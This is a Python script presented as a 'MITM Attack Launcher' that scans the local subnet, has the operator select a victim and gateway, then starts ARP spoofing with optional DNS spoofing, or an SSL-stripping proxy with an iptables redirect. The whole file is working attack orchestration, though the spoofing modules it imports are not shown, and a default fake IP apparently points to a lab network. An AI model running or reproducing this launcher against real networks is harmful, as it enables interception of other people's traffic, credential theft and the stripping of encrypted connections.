from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing, restore_arp
from attacks.dns_spoof import start_dns_spoofer
from attacks.ssl_strip import start_ssl_strip_proxy
from scapy.arch import get_if_list
import threading
import signal
import sys

def choose_host(hosts, role):
    print("\nSelect a {}:".format(role))
    for i, (ip, mac) in enumerate(hosts):
        print("{}: {} ({})".format(i, ip, mac))
    while True:
        try:
            choice = int(input("Enter index for {}: ".format(role)))
            return hosts[choice]
        except (ValueError, IndexError):
            print("Invalid selection, try again.")

def main():
    print("=== MITM Attack Launcher ===")
    print("1. ARP Spoofing (and DNS Spoofing)")
    print("2. SSL Stripping proxy only")

    try:
        choice = int(input("Choose attack mode (1-2): "))
    except ValueError:
        print("Invalid input")
        return

    if choice == 1:
        # 1. Choose network interface
        interfaces = get_if_list()
        print("\nAvailable network interfaces:")
        for i, iface in enumerate(interfaces):
            print("{}: {}".format(i, iface))
        while True:
            try:
                iface_idx = int(input("Choose interface index: "))
                iface = interfaces[iface_idx]
                break
            except (ValueError, IndexError):
                print("Invalid choice, try again.")

        # 2. Get attacker's IP and MAC
        attacker_ip = get_attacker_ip(iface)
        attacker_mac = get_attacker_mac(iface)

        # 3. Scan the network
        subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"
        hosts = scan_network(subnet, iface=iface)

        if len(hosts) < 2:
            print("[-] Not enough devices on network to launch attack.")
            sys.exit(1)

        # 4. Choose victim and gateway
        victim_ip, victim_mac = choose_host(hosts, "victim")
        gateway_ip, gateway_mac = choose_host(hosts, "gateway")

        # 5. Ask whether to run DNS spoofing
        dns_choice = input("\nEnable DNS spoofing? (y/n): ").strip().lower()
        fake_ip = None
        if dns_choice == "y":
            fake_ip = input("Enter fake IP (default = 192.168.56.102): ").strip() or "192.168.56.102"

        # 6. Start ARP spoofing thread
        stop_event = threading.Event()
        print("[*] Starting ARP spoofing...")
        arp_thread = threading.Thread(
            target=start_arp_spoofing,
            args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event),
            daemon=True
        )
        arp_thread.start()

        try:
            if dns_choice == "y":
                print("[*] Starting DNS spoofing...")
                start_dns_spoofer(fake_ip=fake_ip, iface=iface)
            else:
                print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
                while True:
                    signal.pause()

        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt detected. Cleaning up...")

        finally:
            print("[*] Restoring ARP tables...")
            stop_event.set()
            arp_thread.join()
            print("[+] Cleanup complete. Exiting.")

    elif choice == 2:
        port = int(input("Enter local port to listen on (default 8080): ") or "8080")
        use_iptables = input("Add iptables redirect? (y/n): ").lower() == "y"
        start_ssl_strip_proxy(port, use_iptables)
    else:
        print("Invalid choice.")



if __name__ == "__main__":
    main()
